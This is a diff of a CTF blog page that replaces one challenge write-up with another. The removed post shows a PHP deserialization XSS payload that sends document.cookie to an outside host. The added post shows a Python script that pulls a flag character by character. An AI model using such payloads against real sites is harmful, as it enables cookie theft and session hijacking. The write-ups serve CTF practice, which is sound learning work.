@@ -5,7 +5,7 @@
     
 <meta charset="utf-8" >
 
-<title>[BJDCTF 2nd]xss之光 | ev11ccaatt</title>
+<title>ctfshow 阿拉丁 | ev11ccaatt</title>
 <meta name="description" content="人菜多学">
 
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
@@ -80,37 +80,39 @@
       <div class="content-container">
         <div class="post-detail">
           
-          <h2 class="post-title">[BJDCTF 2nd]xss之光</h2>
+          <h2 class="post-title">ctfshow 阿拉丁</h2>
           <div class="post-info post-detail-info">
-            <span><i class="icon-calendar-outline"></i> 2021-04-06</span>
+            <span><i class="icon-calendar-outline"></i> 2021-04-08</span>
             
           </div>
           <div class="post-content">
-            <p>进去没有信息，抓个包看下，当时第一是发现 Server: openresty 找了几个payload看了下，貌似不是这里。</p>
-<p>那么还是老办法吧，扫目录。</p>
-<p>开奖了，有git文件泄露.</p>
-<p>发现就一个文件</p>
-<pre><code>&lt;?php
-$a = $_GET['yds_is_so_beautiful'];
-echo unserialize($a);
+            <p>emmm，这道题很水。<br>
+主要是写个py脚本，所以记录一下。</p>
+<pre><code>import requests
+import json
+flag= ''
+url = 'http://3b6d2cbe-d77a-4920-8246-f9c7b4eec55e.challenge.ctf.show:8080/'
+for i in range(1,50):
+    data = {
+        'wish':&quot;flag的第{}位是什么?&quot;.format(i)
+        }
+    heads ={'Content-Type': 'application/json'}
+    r =requests.post(url=url,headers=heads,data=json.dumps(data));
+    if i&lt;10:
+        flag+=r.text[8:]
+    else:
+        flag+=r.text[9:]
+print(flag)
 </code></pre>
-<p>一番搜索发现是php原生类的利用,<a href="https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html">反序列化之PHP原生类的利用</a></p>
-<p>由于是php5.6那么构造</p>
-<pre><code>&lt;?php
-$a = new Exception(&quot;&lt;script&gt;window.open('http://99cb3fc4-b241-4edb-aa24-b550de1ef186.node3.buuoj.cn/?'+document.cookie);&lt;/script&gt;&quot;);
-$b = serialize($a);
-echo urlencode($b);
-</code></pre>
-<p>即可，传入后在cookie可以看到flag.</p>
 
           </div>
         </div>
 
         
           <div class="next-post">
-            <a class="purple-link" href="https://ev11ccaatt.github.io/post/bjdctf-2ndjian-dan-zhu-ru/">
+            <a class="purple-link" href="https://ev11ccaatt.github.io/post/bjdctf-2ndschrodinger/">
               <h3 class="post-title">
-                下一篇：[BJDCTF 2nd]简单注入
+                下一篇：[BJDCTF 2nd]Schrödinger
               </h3>
             </a>
           </div>
